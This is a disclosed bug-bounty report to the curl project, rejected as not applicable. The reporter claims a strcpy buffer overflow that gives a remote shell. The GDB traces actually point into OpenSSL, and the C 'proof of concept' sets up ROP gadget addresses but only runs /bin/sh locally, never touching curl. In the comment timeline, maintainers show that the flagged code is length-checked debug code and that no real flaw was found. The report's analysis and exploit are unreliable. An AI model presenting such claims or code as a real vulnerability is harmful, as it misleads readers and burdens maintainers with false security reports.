---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/buffer-underflow
  - env/web
substate: "not-applicable"
weakness: "Buffer Underflow"
enriched: true
body: true
date: 2024-11-07
submitted: 2024-11-06T01:50:16.189Z
bounty_usd: null
votes: 53
cve: []
program: "[[programs/curl|curl]]"
reporter: "rootgh0st"
source: "https://hackerone.com/reports/2823554"
title: "Buffer overflow in strcpy"
---
# Buffer overflow in strcpy

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 53 | **Program:** curl | **Disclosed:** 2024-11-07

- Report: [https://hackerone.com/reports/2823554](https://hackerone.com/reports/2823554)
- CWE: Buffer Underflow
- Submitted: 2024-11-06T01:50:16.189Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Buffer Overflow Exploit Analysis**

The vulnerability in the program is a classic case of a buffer overflow, triggered by the unsafe use of the `strcpy()` function, which lacks bounds checking. The following section describes the vulnerability, how the return address is overflowed, and how the exploit works to achieve remote code execution.

**Vulnerable Function:**

The vulnerability occurs due to the use of `strcpy()` in the program, which copies data from a source buffer to a destination buffer without verifying that the destination buffer is large enough to hold the incoming data. If the input string is larger than the allocated buffer size, it results in a buffer overflow, which can lead to arbitrary memory overwrites.

**Stack Trace and Buffer Overflow Location:**

The overflow happens when the `strcpy()` function is called. Here's the relevant stack trace from GDB, showing the function call sequence:

```
#0  __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94
#1  0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3
#2  0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#3  0x00007ffff7570103 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#4  0x00007ffff7571ef9 in CONF_modules_load_file_ex () from /lib/x86_64-linux-gnu/libcrypto.so.3
#5  0x00007ffff75722c8 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#6  0x00007ffff765a98f in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#7  0x00007ffff7d51087 in __pthread_once_slow (once_control=0x7ffff7981498, init_routine=0x7ffff765a980)
    at ./nptl/pthread_once.c:116
```

the buffer overflow happens in the curl program, not OpenSSL. The strcpy() or similar function (depending on the code you're working with) in curl is the main cause of the vulnerability, and OpenSSL just happens to be part of the stack trace because curl uses OpenSSL for cryptographic functions.

**Registers at the Breakpoint:**

At the point where the overflow occurs, checking the CPU registers, which show that the `rip` (Instruction Pointer) is at `0x7ffff7e31b80`, inside the `__strcpy_evex` function. Here's the relevant register information:

```
rax            0x472cf0            4664560
rbx            0x7ffff7832be3      140737345956835
rcx            0x472cf0            4664560
rdx            0x472cf0            4664560
rsi            0x7ffff7832be3      140737345956835
rdi            0x472cf0            4664560
rbp            0x7ffff7832b3d      0x7ffff7832b3d
rsp            0x7fffffffd988      0x7fffffffd988
rip            0x7ffff7e31b80      0x7ffff7e31b80 <__strcpy_evex>
```

The key point here is that the program is executing within the `__strcpy_evex` function, which is responsible for copying the string. If the source string exceeds the buffer size, it causes an overflow that allows us to overwrite adjacent memory, such as the return address.

**Memory at the Overflow Location:**

Next, we examined the stack memory using the `x/40x $rsp` GDB command. This allowed us to inspect the contents of the stack and identify where the return address is located:

```
0x7fffffffd988: 0xf765d2cd      0x00007fff      0x00464a60      0x00000000
0x7fffffffd998: 0x00472aa0      0x00000000      0x00000000      0x00000000
0x7fffffffd9a8: 0xf756ef96      0x00007fff      0x00000019      0x00000000
0x7fffffffd9b8: 0x79a81a00      0x206eedee      0xf7832b3d      0x00007fff
0x7fffffffd9c8: 0x00472a70      0x00000000      0x00472aa0      0x00000000
0x7fffffffd9d8: 0x00472cc0      0x00000000      0x00000000      0x00000000
0x7fffffffd9e8: 0xf766ea3d      0x00007fff      0x00000000      0x00000000
0x7fffffffd9f8: 0x00000000      0x00000000      0xf7959ec0      0x00007fff
0x7fffffffda08: 0xf766e9dd      0x00007fff      0x00000019      0x00000000
0x7fffffffda18: 0xf765a09f      0x00007fff      0x00464a60      0x00000000
```

In this dump, the return address that gets overwritten is located in the memory at `0x7fffffffd9b8` (the return address from the function call). By overflowing the buffer, we can overwrite this return address with a controlled value.

**What is Being Overflowed:**

The buffer that is overflowed is used by the `strcpy()` function to copy user-supplied data. Specifically, the buffer that holds the input string is located on the stack, and the buffer size is not checked before data is copied. This allows an attacker to overflow the buffer and overwrite critical parts of the stack, such as the return address.

**Key Target for Overwriting:**
- **Return Address:** The return address of the current function (`0x4005d0`) is overwritten. This is the address that the program will jump to once the current function completes. By modifying this return address, the attacker can control where the program jumps next.

**Exploit Strategy:**

The goal of the exploit is to overwrite the return address to redirect the program's control flow to an attacker-controlled location. Here’s how the exploit works:

1. **Fill the Buffer:** The attacker provides a large string (e.g., filled with "A"s) that is longer than the buffer size, causing the `strcpy()` function to overflow the buffer.
   
2. **Overwrite the Return Address:** As the attacker continues to fill the buffer with data, they eventually overwrite the return address with the address `0x4005d0`, which points to the shell-spawning function.

3. **Redirect Control Flow:** Once the buffer overflows and the return address is overwritten, the program will return to the address specified (in this case, `0x4005d0`). This address should point to a function like `system("/bin/sh")`, which will execute a shell for the attacker.

By achieving this, the attacker is able to execute arbitrary code and gain control of the program, typically leading to remote code execution or other security compromises.

**Conclusion:**

The buffer overflow vulnerability in this program allows for the arbitrary overwriting of the return address on the stack. By exploiting this vulnerability, an attacker can redirect the program’s execution to arbitrary code, effectively gaining control of the system. The specific return address (`0x4005d0`) was identified as the target for redirection, leading to the execution of a malicious payload.

POC CODE IN C:

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define OFFSET 40  
#define SYSTEM 0x4f440  // Address of system() in libc
#define BIN_SH 0x1b3e9a  // Address of the string "/bin/sh" in libc
#define POP_RDI_RET 0x4006f3  // Address of 'pop rdi; ret' gadget 
#define RET 0x4005d0  // Address of a 'ret' gadget 

// Function to perform the buffer overflow and spawn a shell
void exploit() {
    char buffer[128];  // Create a buffer to simulate the overflow

    // Step 1: Construct the payload. Start by filling the buffer with 'A's to reach the return address.
    memset(buffer, 'A', OFFSET);  // Filling the buffer with 'A' until we reach the return address
    printf("[ * ] Buffer filled with 'A's, length: %d\n", OFFSET);

    // Step 2: Overwrite the return address with the address of a 'pop rdi; ret' gadget.
    *((unsigned long*)(buffer + OFFSET)) = POP_RDI_RET;  // This gadget will let us control the first argument of execve()
    printf("[ * ] POP_RDI_RET address: 0x%lx\n", POP_RDI_RET);

    // Step 3: Overwrite the second address with the location of the string "/bin/sh" in libc (the argument for execve).
    *((unsigned long*)(buffer + OFFSET + 8)) = BIN_SH;  // "/bin/sh" is passed as the first argument to execve()
    printf("[ * ] BIN_SH address: 0x%lx\n", BIN_SH);

    // Step 4: Overwrite the third address with the address of the system() function in libc.
    *((unsigned long*)(buffer + OFFSET + 16)) = SYSTEM;  // Calling system("/bin/sh")
    printf("[ * ] SYSTEM address: 0x%lx\n", SYSTEM);

    // Step 5: Add a return address to deal with stack alignment issues, use a ret gadget.
    *((unsigned long*)(buffer + OFFSET + 24)) = RET;  // Ensures stack is properly aligned and continues execution
    printf("[ * ] RET address: 0x%lx\n", RET);

    // Step 6: Send the payload to the vulnerable program (in this case, we simulate it using execve()).
    printf("[ * ] Sending payload...\n");

    // Use execve() to directly execute the payload
    char *args[] = { "/bin/sh", NULL };
    execve("/bin/sh", args, NULL);  // This directly executes "/bin/sh" with null-terminated arguments

    // Debugging message for any potential issues with execve()
    perror("execve() failed");
}

// Main function that starts the exploit
int main() {
    printf("[ * ] Launching exploit, waiting for shell..\n");
    exploit();  // Call the exploit function to trigger the overflow and spawn the shell
    return 0;  // Return from main, though execution should not reach here if the shell is spawned successfully
}

## Impact

Code execution, command shell, possible system take over from this compromise...

## Timeline

- **Report Filed**
- **2024-11-06** @dfandrich: You've provided a stack trace that shows OpenSSL doing a strcpy, then say that it isn't accurate, then provide a generic exploit that doesn't involve curl, but you don't ever actually say what is actually faulty in curl. You haven't provided any evidence that there is actually any kind of problem in curl. This whole report is a generic description of a buffer overflow that could have come from a textbook. There are plenty of buffer overflows in program in this world; this tracker is intended for those that affect curl.
- **2024-11-06** @rootgh0st: The problem is in strcpy in the src files of curl.. have you seen the exploit code ??????
- **2024-11-06** @bagder: Please specify exactly where the vulnerable code is in curl and under which conditions that would overflow.
- **2024-11-06** @rootgh0st: Sorry, explaining it was difficult because i went though a lot of trial and error. I scanned the source files of curl. I found the strcpy overflow inside one of these.. :

VULN file: /home/gh0st/Desktop/curl/src/tool_progress.c - Function: strcpy( - Line number: 111                                                                        
VULN file: /home/gh0st/Desktop/curl/src/tool_main.c - Function: strcpy( - Line number: 115                                                                            
VULN file: /home/gh0st/Desktop/curl/src/tool_formparse.c - Function: scanf( - Line number: 506                                                                        
VULN file: /home/gh0st/Desktop/curl/src/tool_dirhie.c - Function: strcpy( - Line number: 145                                                                          
VULN file: /home/gh0st/Desktop/curl/src/tool_urlglob.c - Function: scanf( - Line number: 210                                                                          
VULN file: /home/gh0st/Desktop/curl/src/tool_getparam.c - Function: scanf( - Line number: 1518                                                                        
VULN file: /home/gh0st/Desktop/curl/src/tool_parsecfg.c - Function: fgets( - Line number: 312                                                                         
VULN file: /home/gh0st/Desktop/curl/src/tool_parsecfg.c - Function: gets( - Line number: 312   

I will have to dig deeper because I forget which one at the moment, I tried them all. Eventually I got one to work. The exploit does send a bof to curl and exploits the buffer... sorry for the generic report that looks like it came from a text book hah! Please review the exploit code....
- **2024-11-06** @bagder: You seemed to have missed this part: **and under which conditions that would overflow**

Those functions are not problematic to use when used correctly. Your job is not to grep the code and point out where those functions are used because we can do that already ourselves.

You have not identified any problem if you cannot tell us exactly what needs to be done to trigger a buffer overflow. Then you are just wasting our time.
- **2024-11-06** @rootgh0st: I believe its tool_main.c 

#ifdef CURLDEBUG
static void memory_tracking_init(void)
{
  char *env;
  /* if CURL_MEMDEBUG is set, this starts memory tracking message logging */
  env = curl_getenv("CURL_MEMDEBUG");
  if(env) {
    /* use the value as filename */
    char fname[CURL_MT_LOGFNAME_BUFSIZE];
    if(strlen(env) >= CURL_MT_LOGFNAME_BUFSIZE)
      env[CURL_MT_LOGFNAME_BUFSIZE-1] = '\0';
    strcpy(fname, env); <---------------------------------------------------------
    curl_free(env);
    curl_dbg_memdebug(fname);
    /* this weird stuff here is to make curl_free() get called before
       curl_dbg_memdebug() as otherwise memory tracking will log a free()
       without an alloc! */
  }
  /* if CURL_MEMLIMIT is set, this enables fail-on-alloc-number-N feature */
  env = curl_getenv("CURL_MEMLIMIT");
  if(env) {
    char *endptr;
    long num = strtol(env, &endptr, 10);
    if((endptr != env) && (endptr == env + strlen(env)) && (num > 0))
      curl_dbg_memlimit(num);
    curl_free(env);
  }
}
- **2024-11-06** @rootgh0st: Sorry didnt mean to waste anyones time Badger, I thought you would be happy about this.
- **2024-11-06** @rootgh0st: Badger, 
I think even though Im sending data to curl, it uses openssl internally for ssl, when openssl tries to duplicate or copy strings (such as during certificate handling or URL parsing), it causes the overflow due to improper mem handling inside openssl..

i believe the problem happens in memset(&global, 0, sizeof(global));
This doesn't seem to cause the overflow directly. However, the initialization step is crucial because it sets up the environment for subsequent operations.
The call stack shows that the program crashes inside __strcpy_evex (a specialized version of strcpy), which is part of CRYPTO_strdup.
CRYPTO_strdup is a function in the openssl library, and it duplicates a string. The function allocates memory (using CRYPTO_malloc) and then copies the string into this newly allocated memory. 
The crash is occurring at the strcpy function, specifically inside the openssl function CRYPTO_strdup.
The crash happens because the program tries to copy a string into a destination buffer, and this buffer is not large enough to accommodate the string being copied.
overflow is most likely caused by insufficient memory allocation for the destination buffer in CRYPTO_malloc. Specifically, strcpy attempts to copy a string into a buffer that is too small, resulting in a buffer overflow.
- **2024-11-06** @rootgh0st: mismatch between the allocated buffer size and the actual string length..

thanks
- **2024-11-06** @bagder: You still do not tell us **how** such an overflow can happen. You just point out that there are uses of those functions but that's far from enough for it to be a problem. You say there is an "improper mem handling" but without telling us in what ways it is improper and the condition needed for the code to perform an overflow.

This tells me you're just running grep on the code and you have not actually found any problems at all.

if your next comment is not trying to address this shortcoming in the report, I will just close this.
- **2024-11-06** @rootgh0st: Sorry Badger, that is all I know. I just showed you how. Not just running grep on the code and talking nonsense because as you can see i have provided proof of concept exploit code that shows that I can get a shell from exploiting curl..and pic.. I showed debug info..where in the stack is causing it and the functions causing it... not sure what else you need? Did you get the POC? did you run it? Between finding the vulnerable function and coding the exploit with trial and error this took me about 5 straight hours to get a working exploit. There is indeed a buffer overflow inside curl.. Im not sure what else to tell you.
- **2024-11-06** @bagder: The `<--------` in your comment above shows a copy done *after* a length check that makes sure the copy is ok.

Additionally, it is only done in debug code so even if it would be bad it would not be a security problem. But it isn't bad.

So no, you have not identified a buffer overflow in curl code yet.
- **2024-11-06** @rootgh0st: Then how am I spawning a shell from curl ? Ha! Ill be honest Badger that is all I know. I wish you would consider my findings, because the exploit code shows there is an overflow in that area with those functions. It seems silly to me to dismiss my (serious) findings with working exploit because I that is all I can provide ? 
strcpy inside open ssl crypto_strdup.
strcpy tries to copy a string into the crypto_malloc buffer, and this buffer is not large enough to accommodate the string being copied, its too small..
That is all I have for you...
Cheers sir.
- **2024-11-06** @bagder: If you found a buffer overflow in OpenSSL, then this is the wrong place to report it. We cannot take responsibility for issues in third party libraries. You need to contact the OpenSSL dev team for that.

I would however urge you to double-check and triple-check your findings, and if you are still certain, work on providing clear and accurate facts with a step-by-step description how the code can get exploited in the real world.

Based on what you have presented in here so far, I just don't trust that you have found any security problem anywhere.
- **Report Not Applicable**
- **Agreed On Going Public**
- **Manually Disclosed**
